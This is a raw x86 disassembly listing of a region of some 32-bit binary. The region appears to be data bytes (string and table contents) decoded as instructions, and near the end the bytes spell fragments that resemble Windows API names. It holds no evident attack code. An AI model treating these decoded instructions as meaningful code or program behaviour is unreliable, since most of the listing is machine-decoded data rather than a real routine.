  423743:	xlat   BYTE PTR ds:[ebx]
  423744:	repz or esi,edi
  423747:	das    
  423748:	cli    
  423749:	fist   WORD PTR [ecx]
  42374b:	dec    ebx
  42374c:	es nop
  42374e:	sub    BYTE PTR [esi-0x69],ch
  423751:	aas    
  423752:	pop    ecx
  423753:	loop   0x423756
  423755:	add    BYTE PTR [ebx+0x0],ah
  423758:	add    BYTE PTR [eax],al
  42375a:	les    ecx,FWORD PTR [ebp+0x3aeb4b65]
  423760:	outs   dx,BYTE PTR ds:[esi]
  423761:	ror    cl,1
  423763:	jmp    0x203a5f3c
  423768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423769:	in     eax,dx
  42376a:	or     bl,BYTE PTR [edx-0x2f1a17d8]
  423770:	add    ebx,ebx
  423772:	pushf  
  423773:	and    BYTE PTR [ebp-0x6ad4fe4f],dh
  423779:	mov    eax,ds:0x9e262b2a
  42377e:	out    dx,al
  42377f:	and    dl,dh
  423781:	pop    eax
  423782:	push   edx
  423783:	add    eax,0x254cafbb
  423788:	and    eax,0x551db574
  42378d:	add    ah,BYTE PTR [esi]
  42378f:	lods   eax,DWORD PTR ds:[esi]
  423790:	adc    BYTE PTR [esi+0x5be484bd],0x5f
  423797:	outs   dx,DWORD PTR ds:[esi]
  423798:	adc    al,BYTE PTR [ebx+0x6df2a331]
  42379e:	in     eax,0x34
  4237a0:	ret    
  4237a1:	sahf   
  4237a2:	stc    
  4237a3:	inc    edi
  4237a4:	icebp  
  4237a5:	pop    esi
  4237a6:	add    ecx,DWORD PTR [ebx+0x6900b7b3]
  4237ac:	nop
  4237ad:	sub    bh,BYTE PTR [esp+esi*2]
  4237b0:	jp     0x4237cf
  4237b2:	pop    ebp
  4237b3:	push   ebp
  4237b4:	out    0xd1,eax
  4237b6:	push   ebx
  4237b7:	lods   al,BYTE PTR ds:[esi]
  4237b8:	pop    es
  4237b9:	fs push edx
  4237bb:	enter  0xc7,0x0
  4237bf:	add    BYTE PTR [eax],al
  4237c1:	add    BYTE PTR [eax],al
  4237c3:	rol    BYTE PTR [edx+0x0],0x4
  4237c7:	rol    BYTE PTR [edx+0x0],0x8
  4237cb:	rol    BYTE PTR [edx+0x0],0xc
  4237cf:	rol    BYTE PTR [edx+0x0],0x10
  4237d3:	rol    BYTE PTR [edx+0x0],0x14
  4237d7:	rol    BYTE PTR [edx+0x0],0x18
  4237db:	rol    BYTE PTR [edx+0x0],0x1c
  4237df:	rol    BYTE PTR [edx+0x0],0x57
  4237e3:	inc    edi
  4237e4:	cmp    DWORD PTR [edi+0x41],ebx
  4237e7:	pop    eax
  4237e8:	ss push esi
  4237ea:	pop    edi
  4237eb:	cmp    BYTE PTR [eax],al
  4237ed:	inc    ebx
  4237ee:	inc    ebp
  4237ef:	dec    esp
  4237f0:	pop    edi
  4237f1:	pop    eax
  4237f2:	push   edi
  4237f3:	dec    eax
  4237f4:	inc    edx
  4237f5:	add    BYTE PTR [edi+0x50],dl
  4237f8:	xor    eax,0x4641365f
  4237fd:	cmp    DWORD PTR [edx],esi
  4237ff:	xor    ebx,DWORD PTR [edi+0x32]
  423802:	aaa    
  423803:	add    BYTE PTR [eax+0x48],dl
  423806:	xor    BYTE PTR [edi+0x58],bl
  423809:	push   esp
  42380a:	inc    ecx
  42380b:	dec    ebp
  42380c:	push   ecx
  42380d:	pop    edi
  42380e:	inc    esi
  42380f:	push   ebp
  423810:	cmp    DWORD PTR [eax],eax
  423812:	push   edi
  423813:	push   ebp
  423814:	inc    ecx
  423815:	xor    dh,BYTE PTR [ebx]
  423817:	xor    ebx,DWORD PTR [edi+0x4e]
  42381a:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42381e:	cmp    DWORD PTR [edi+0x38],ebx
  423821:	dec    ecx
  423822:	cmp    DWORD PTR [edx+0x36],ebx
  423825:	pop    edi
  423826:	dec    edx
  423827:	xor    BYTE PTR [edx+0x34],cl
  42382a:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42382e:	xor    esi,DWORD PTR [eax]
  423830:	pop    edi
  423831:	inc    edx
  423832:	dec    ebx
  423833:	pop    eax
  423834:	pop    eax
  423835:	xor    eax,0x51414d00
  42383a:	pop    edi
  42383b:	inc    ecx
  42383c:	xor    al,BYTE PTR [ebp+0x5f]
  42383f:	inc    ecx
  423840:	dec    ebx
  423841:	cmp    DWORD PTR ds:0x5a003939,esi
  423847:	inc    ebp
  423848:	cmp    BYTE PTR [edi+0x4d],bl
  42384b:	ss dec eax
  42384d:	dec    ebx
  42384e:	add    BYTE PTR [ebp+0x57],al
  423851:	xor    DWORD PTR [edi+0x31],ebx
  423854:	dec    ebx
  423855:	xor    eax,DWORD PTR [ecx+0x30]
  423858:	push   ebx
  423859:	add    BYTE PTR [edx+esi*1+0x36],al
  42385d:	aaa    
  42385e:	pop    edi
  42385f:	push   edx
  423860:	dec    eax
  423861:	dec    ebp
  423862:	cmp    BYTE PTR [edi+0x37],bl
  423865:	inc    esi
  423866:	xor    eax,0x43355500
  42386b:	pop    edi
  42386c:	pop    ecx
  42386d:	dec    ecx
  42386e:	push   ebx
  42386f:	xor    bl,BYTE PTR [edi+0x52]
  423872:	add    BYTE PTR [eax+0x55],dl
  423875:	dec    ecx
  423876:	xor    BYTE PTR [edi+0x43],bl
  423879:	ss inc ebp
  42387b:	xor    bl,BYTE PTR [edi+0x4d]
  42387e:	xor    al,0x4a
  423880:	push   edx
  423881:	push   ebp
  423882:	add    BYTE PTR [esi+0x39],cl
  423885:	push   eax
  423886:	pop    edi
  423887:	push   ebp
  423888:	cmp    DWORD PTR [esi],esi
  42388a:	xor    BYTE PTR [ecx],dh
  42388c:	pop    edi
  42388d:	dec    edi
  42388e:	dec    esi
  42388f:	push   esp
  423890:	cmp    BYTE PTR [eax],al
  423892:	dec    esp
  423893:	xor    al,0x44
  423895:	xor    DWORD PTR [edi+0x4b],ebx
  423898:	xor    DWORD PTR [ebp+0x5f],eax
  42389b:	pop    edx
  42389c:	add    BYTE PTR [edi+esi*1+0x43],dl
  4238a0:	pop    edi
  4238a1:	inc    edx
  4238a2:	xor    dh,BYTE PTR [ecx]
  4238a4:	push   ebx
  4238a5:	xor    DWORD PTR [ecx],edi
  4238a7:	inc    edx
  4238a8:	add    BYTE PTR [edi+0x45],al
  4238ab:	xor    al,0x38
  4238ad:	xor    BYTE PTR [eax],dh
  4238af:	pop    edi
  4238b0:	dec    edx
  4238b1:	dec    ebx
  4238b2:	xor    eax,0x33345f4d
  4238b7:	add    BYTE PTR [ebx+esi*1+0x57],cl
  4238bb:	pop    edi
  4238bc:	aaa    
  4238bd:	push   esi
  4238be:	dec    ebx
  4238bf:	push   edx
  4238c0:	pop    edi
  4238c1:	inc    ebx
  4238c2:	add    BYTE PTR [edx+0x35],bl
  4238c5:	dec    ebp
  4238c6:	pop    edi
  4238c7:	inc    edi
  4238c8:	dec    esi
  4238c9:	xor    al,0x49
  4238cb:	xor    eax,0x54590035
  4238d0:	push   edx
  4238d1:	pop    edi
  4238d2:	push   esp
  4238d3:	inc    ebx
  4238d4:	inc    ecx
  4238d5:	pop    edi
  4238d6:	cmp    DWORD PTR [ecx+0x41],ebx
  4238d9:	push   ebp
  4238da:	pop    edi
  4238db:	push   ebp
  4238dc:	inc    ebp
  4238dd:	add    BYTE PTR [esi+esi*1+0x35],cl
  4238e1:	pop    edi
  4238e2:	pop    eax
  4238e3:	dec    edx
  4238e4:	inc    edx
  4238e5:	inc    edi
  4238e6:	add    BYTE PTR [edx+0x36],al
  4238e9:	inc    ebx
  4238ea:	pop    edi
  4238eb:	xor    BYTE PTR ds:0x36464b,dh
  4238f1:	dec    ebx
  4238f2:	cmp    DWORD PTR [esi+0x37],eax
  4238f5:	xor    ebx,DWORD PTR [edi+0x35]
  4238f8:	ss inc edi
  4238fa:	pop    ecx
  4238fb:	dec    eax
  4238fc:	pop    ecx
  4238fd:	add    BYTE PTR [ebp+0x35],cl
  423900:	push   eax
  423901:	xor    BYTE PTR [edi+0x4f],bl
  423904:	pop    ecx
  423905:	xor    cl,BYTE PTR [edi+0x0]
  423908:	pop    ecx
  423909:	xor    DWORD PTR [esi+0x5f],ecx
  42390c:	xor    al,BYTE PTR [edx+0x30]
  42390f:	push   esi
  423910:	push   esp
  423911:	inc    ebp
  423912:	add    BYTE PTR [edi+0x37],al
  423915:	push   esi
  423916:	xor    DWORD PTR [edi+0x49],ebx
  423919:	xor    al,BYTE PTR [esi+0x30]
  42391c:	pop    edi
  42391d:	ss dec esi
  42391f:	cmp    BYTE PTR [eax],al
  423921:	pop    edx
  423922:	xor    eax,0x445f334b
  423927:	xor    BYTE PTR [eax],bh
  423929:	push   ecx
  42392a:	push   esi
  42392b:	xor    al,0x0
  42392d:	push   ebp
  42392e:	pop    eax
  42392f:	inc    edi
  423930:	xor    DWORD PTR [edi+0x39],ebx
  423933:	push   esp
  423934:	inc    ebx
  423935:	aaa    
  423936:	inc    esp
  423937:	add    BYTE PTR [edi+0x39],dl
  42393a:	ss pop edi
  42393c:	dec    eax
  42393d:	pop    edx
  42393e:	pop    ecx
  42393f:	inc    edi
  423940:	push   ebp
  423941:	pop    edi
  423942:	push   eax
  423943:	dec    eax
  423944:	inc    ebx
  423945:	add    BYTE PTR [ebp+0x0],dl
  423948:	xor    al,0x0
  42394a:	dec    edi
  42394b:	add    BYTE PTR [edi+0x0],bl
  42394e:	cmp    BYTE PTR [eax],al
  423950:	xor    al,BYTE PTR [eax]
  423952:	inc    ebx
  423953:	add    BYTE PTR [edx+0x0],bl
  423956:	inc    ebx
  423957:	add    BYTE PTR [edi],dh
  423959:	add    BYTE PTR [edi+0x0],bl
  42395c:	inc    ebx
  42395d:	add    BYTE PTR [eax+eax*1+0x0],al
  423961:	add    BYTE PTR [eax+eax*1+0x4b],cl
  423965:	add    BYTE PTR [edx],dh
  423967:	add    BYTE PTR [edi+0x0],bl
  42396a:	cmp    BYTE PTR [eax],al
  42396c:	dec    esp
  42396d:	add    BYTE PTR [esi+0x0],dl
  423970:	pop    edi
  423971:	add    BYTE PTR [ecx+0x0],bl
  423974:	push   edx
  423975:	add    BYTE PTR [esi+0x0],dl
  423978:	xor    al,BYTE PTR [eax]
  42397a:	cmp    BYTE PTR [eax],al
  42397c:	pop    edi
  42397d:	add    BYTE PTR [edx+0x0],cl
  423980:	add    BYTE PTR [eax],al
  423982:	inc    edx
  423983:	add    BYTE PTR [eax+eax*1+0x46],cl
  423987:	add    BYTE PTR [edi+0x0],bl
  42398a:	xor    eax,DWORD PTR [eax]
  42398c:	inc    ebp
  42398d:	add    BYTE PTR [ecx+0x0],cl
  423990:	push   edx
  423991:	add    BYTE PTR [ecx],bh
  423993:	add    BYTE PTR [esi+0x0],dl
  423996:	add    BYTE PTR [eax],al
  423998:	dec    ebp
  423999:	add    BYTE PTR [edi],dh
  42399b:	add    BYTE PTR [eax+eax*1+0x5f],al
  42399f:	add    BYTE PTR [edx+0x0],cl
  4239a2:	pop    eax
  4239a3:	add    BYTE PTR [ebx],dh
  4239a5:	add    BYTE PTR [ecx],dh
  4239a7:	add    BYTE PTR [ebx+0x0],al
  4239aa:	add    BYTE PTR [eax],al
  4239ac:	dec    edi
  4239ad:	add    BYTE PTR [esi],dh
  4239af:	add    BYTE PTR [eax+0x0],cl
  4239b2:	pop    edi
  4239b3:	add    BYTE PTR [eax],dh
  4239b5:	add    BYTE PTR [edi],dh
  4239b7:	add    BYTE PTR [ecx],dh
  4239b9:	add    BYTE PTR [edx+0x0],dl
  4239bc:	xor    eax,0x55000000
  4239c1:	add    BYTE PTR [eax+eax*1+0x5a],dl
  4239c5:	add    BYTE PTR [edi+0x0],bl
  4239c8:	push   esp
  4239c9:	add    BYTE PTR [ecx+0x0],al
  4239cc:	cmp    DWORD PTR [eax],eax
  4239ce:	pop    edi
  4239cf:	add    BYTE PTR [ebx],dh
  4239d1:	add    BYTE PTR [eax],dh
  4239d3:	add    BYTE PTR [eax],bh
  4239d5:	add    BYTE PTR [edi+0x0],cl
  4239d8:	inc    ebx
  4239d9:	add    BYTE PTR ds:0x4d000000,dh
  4239df:	add    BYTE PTR [esi+0x0],cl
  4239e2:	inc    ebp
  4239e3:	add    BYTE PTR [edi+0x0],bl
  4239e6:	push   esp
  4239e7:	add    BYTE PTR [esi+0x0],al
  4239ea:	cmp    BYTE PTR [eax],al
  4239ec:	push   ebx
  4239ed:	add    BYTE PTR [edx+0x0],bl
  4239f0:	pop    edi
  4239f1:	add    BYTE PTR [eax],dh
  4239f3:	add    BYTE PTR [eax],bh
  4239f5:	add    BYTE PTR [eax+0x0],cl
  4239f8:	add    BYTE PTR [eax],al
  4239fa:	dec    esi
  4239fb:	add    BYTE PTR [edi+0x0],cl
  4239fe:	pop    edx
  4239ff:	add    BYTE PTR [edi+0x0],bl
  423a02:	add    BYTE PTR ss:[ecx+0x0],bl
  423a06:	dec    ebp
  423a07:	add    BYTE PTR [esi],dh
  423a09:	add    BYTE PTR [ebx],dh
  423a0b:	add    BYTE PTR [edi+0x0],bl
  423a0e:	xor    al,0x0
  423a10:	dec    esi
  423a11:	add    BYTE PTR [edx],dh
  423a13:	add    BYTE PTR [esi],dh
  423a15:	add    BYTE PTR [ecx],dh
  423a17:	add    BYTE PTR [eax],al
  423a19:	add    BYTE PTR [ebx+0x0],cl
  423a1c:	dec    eax
  423a1d:	add    BYTE PTR [eax],bh
  423a1f:	add    BYTE PTR [edi+0x0],bl
  423a22:	inc    esi
  423a23:	add    BYTE PTR [esi+0x0],al
  423a26:	push   esp
  423a27:	add    BYTE PTR [edi],dh
  423a29:	add    BYTE PTR [esi],dh
  423a2b:	add    BYTE PTR [edi+0x0],bl
  423a2e:	dec    esp
  423a2f:	add    BYTE PTR [ecx+0x0],bl
  423a32:	add    BYTE PTR [eax],al
  423a34:	push   ebx
  423a35:	add    BYTE PTR [ecx+0x0],bl
  423a38:	xor    BYTE PTR [eax],al
  423a3a:	pop    edi
  423a3b:	add    BYTE PTR [ecx],bh
  423a3d:	add    BYTE PTR [edx+0x0],dl
  423a40:	dec    eax
  423a41:	add    BYTE PTR [ecx+0x0],bl
  423a44:	xor    al,BYTE PTR [eax]
  423a46:	pop    edi
  423a47:	add    BYTE PTR [eax],dh
  423a49:	add    BYTE PTR [eax],al
  423a4b:	add    BYTE PTR [edx+0x0],al
  423a4e:	dec    edx
  423a4f:	add    BYTE PTR [esi+0x0],cl
  423a52:	xor    al,BYTE PTR [eax]
  423a54:	pop    edi
  423a55:	add    BYTE PTR [eax+eax*1+0x33],cl
  423a59:	add    BYTE PTR [edx+0x0],dl
  423a5c:	xor    al,0x0
  423a5e:	dec    eax
  423a5f:	add    BYTE PTR [eax],al
  423a61:	add    BYTE PTR [ebp+0x0],dl
  423a64:	add    BYTE PTR ss:[ebp+0x0],cl
  423a68:	xor    DWORD PTR [eax],eax
  423a6a:	pop    edi
  423a6b:	add    BYTE PTR [esi],dh
  423a6d:	add    BYTE PTR [ecx+0x0],bl
  423a70:	push   ebp
  423a71:	add    BYTE PTR [eax+eax*1+0x5f],dl
  423a75:	add    BYTE PTR [edi+0x0],cl
  423a78:	inc    esp
  423a79:	add    BYTE PTR [edi+0x0],dl
  423a7c:	push   ebx
  423a7d:	add    BYTE PTR [eax],al
  423a7f:	add    BYTE PTR [edx+0x0],bl
  423a82:	inc    ebx
  423a83:	add    BYTE PTR [ebp+0x0],dl
  423a86:	pop    edi
  423a87:	add    BYTE PTR [ecx],dh
  423a89:	add    BYTE PTR [ebp+0x0],al
  423a8c:	push   esp
  423a8d:	add    BYTE PTR [eax],dh
  423a8f:	add    BYTE PTR [eax],al
  423a91:	add    BYTE PTR [eax],al
  423a93:	add    BYTE PTR [eax],al
  423a95:	add    BYTE PTR [eax-0x7ffbffbe],al
  423a9b:	inc    edx
  423a9c:	add    BYTE PTR [eax],cl
  423a9e:	add    BYTE PTR [edx+0x0],0xc
  423aa2:	add    BYTE PTR [edx+0x0],0x10
  423aa6:	add    BYTE PTR [edx+0x0],0x14
  423aaa:	add    BYTE PTR [edx+0x0],0x18
  423aae:	add    BYTE PTR [edx+0x0],0x1c
  423ab2:	add    BYTE PTR [edx+0x0],0x20
  423ab6:	add    BYTE PTR [edx+0x0],0x24
  423aba:	add    BYTE PTR [edx+0x0],0x28
  423abe:	add    BYTE PTR [edx+0x0],0x0
	...
  423ad2:	add    BYTE PTR [eax],al
  423ad4:	sbb    edi,DWORD PTR [edi+0x4d57]
  423ada:	add    BYTE PTR [eax],al
  423adc:	add    bh,BYTE PTR [ebx]
  423ade:	add    al,BYTE PTR [eax]
  423ae0:	add    DWORD PTR [eax],eax
  423ae2:	add    BYTE PTR [eax],al
  423ae4:	add    DWORD PTR [eax],eax
  423ae6:	add    BYTE PTR [eax],al
  423ae8:	add    DWORD PTR [eax],eax
  423aea:	add    BYTE PTR [eax],al
  423aec:	clc    
  423aed:	cmp    al,BYTE PTR [edx]
  423aef:	add    ah,bh
  423af1:	cmp    al,BYTE PTR [edx]
  423af3:	add    BYTE PTR [eax],al
  423af5:	cmp    eax,DWORD PTR [edx]
  423af7:	add    BYTE PTR [esi-0x31],al
  423afa:	add    BYTE PTR [eax],al
  423afc:	push   cs
  423afd:	cmp    eax,DWORD PTR [edx]
  423aff:	add    BYTE PTR [eax],al
  423b01:	add    BYTE PTR [edi+0x6f],dl
  423b04:	jb     0x423b6a
  423b06:	push   edi
  423b07:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  423b0e:	aas    
  423b0f:	inc    ebp
  423b10:	outs   dx,BYTE PTR ds:[esi]
  423b11:	jne    0x423b80
  423b13:	push   edi
  423b14:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  423b1b:	popa   
  423b1c:	je     0x423b87
  423b1e:	outs   dx,DWORD PTR ds:[esi]
  423b1f:	outs   dx,BYTE PTR ds:[esi]
  423b20:	jae    0x423b75
  423b22:	je     0x423b85
  423b24:	.byte 0x74
